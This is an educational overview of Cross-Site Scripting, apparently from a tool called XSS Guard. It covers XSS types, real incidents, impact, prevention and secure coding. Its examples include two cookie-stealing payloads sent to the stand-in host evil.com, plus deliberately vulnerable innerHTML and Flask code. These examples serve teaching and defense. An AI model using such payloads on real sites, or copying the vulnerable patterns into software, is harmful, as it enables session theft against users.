Understanding XSS

A concise overview of Cross-Site Scripting vulnerabilities, how they work, real-world impact, and how to defend against them.

What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the injected code because it trusts the content served by the website.

XSS is consistently ranked in the OWASP Top 10 list of critical web application security risks. It can lead to session hijacking, credential theft, defacement, and malware distribution.

Key insight: XSS occurs when user input is included in a page without proper sanitization or encoding. The attack targets the user's browser, not the server itself.

Types of XSS

Reflected XSS

High risk

The malicious script is part of the request (usually in a URL parameter) and is immediately reflected back in the server's response. The victim clicks a crafted link, and the script executes in their browser.

Example URL
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Stored XSS

High risk

The malicious script is permanently stored on the target server (in a database, comment field, forum post, etc.). Every user who views the affected page executes the payload without clicking a special link.

Example: malicious comment
Great article! <script>fetch('https://evil.com/log?cookie='+document.cookie)</script>

DOM-based XSS

Medium risk

The vulnerability exists in client-side JavaScript that processes data from an untrusted source (like location.hash or document.referrer) and writes it into the DOM without sanitization. The server never sees the payload.

Vulnerable code
document.getElementById('output').innerHTML = location.hash.slice(1);

Real-world examples

XSS vulnerabilities have been found in some of the largest platforms in the world:

  • British Airways (2018) Attackers injected a script into the payment page via a supply chain compromise. Over 380,000 credit card details were stolen. The company was fined $230 million under GDPR.
  • eBay (2015-2016) Stored XSS in product listings allowed attackers to embed scripts in item descriptions. When buyers viewed the listing, the script could redirect them to phishing pages.
  • Fortnite (2019) A reflected XSS vulnerability in an old, unsecured Epic Games page could have let attackers take over player accounts and make purchases.
  • MySpace Samy Worm (2005) The first major XSS worm. A stored XSS payload added anyone who viewed an infected profile as a friend, spreading to over 1 million users in 20 hours.

Why it matters

XSS attacks can have severe consequences because they execute in the context of a trusted site:

  • Session hijacking Steal session cookies to impersonate users without knowing their password.
  • Credential theft Inject fake login forms that capture usernames and passwords.
  • Keylogging Capture everything a user types on the page, including sensitive data.
  • Phishing Modify page content to display misleading information or redirect to malicious sites.
  • Malware distribution Force the browser to download malware or redirect to exploit kits.
Business impact: Beyond technical damage, XSS incidents lead to regulatory fines (GDPR, PCI-DSS), loss of customer trust, and costly incident response.

Prevention techniques

Defending against XSS requires a layered approach. No single technique is sufficient on its own.

  • ✓
    Output encoding — Encode all user-supplied data before inserting it into HTML, JavaScript, CSS, or URLs. Use context-specific encoding (HTML entities, JS escaping, URL encoding).
  • ✓
    Input validation — Validate and sanitize all input on the server side. Use allowlists (not blocklists) to define acceptable input formats.
  • ✓
    Content Security Policy (CSP) — Set HTTP headers that restrict which scripts the browser can execute. A strict CSP prevents inline scripts and limits script sources.
  • ✓
    HttpOnly cookies — Mark session cookies as HttpOnly so JavaScript cannot access them, neutralizing cookie-stealing XSS payloads.
  • ✓
    Use safe APIs — Prefer textContent over innerHTML. Use templating engines that auto-escape output by default (Jinja2, React JSX).
  • ✓
    Sanitize rich content — If you must allow HTML (e.g., blog comments), use a battle-tested library like DOMPurify or Bleach to strip dangerous elements.

Secure vs. vulnerable code

Vulnerable (Python / Flask)
return f"<p>Hello, {username}</p>"
Secure (using Jinja2 auto-escaping)
return render_template("hello.html", username=username)
{# In template: <p>Hello, {{ username }}</p> #}
{# Jinja2 auto-escapes by default #}

Testing for XSS

This tool (XSS Guard) provides two methods for testing:

  • Detector (pattern matching) Paste any input to check it against known XSS patterns. Useful for validating form inputs during development.
  • Scanner (reflection testing) Point the scanner at an endpoint to check if user input is reflected without encoding. Simulates how a real attacker would probe for reflected XSS.
Remember: Only test applications you own or have explicit permission to test. Unauthorized testing is illegal under computer fraud laws in most jurisdictions.
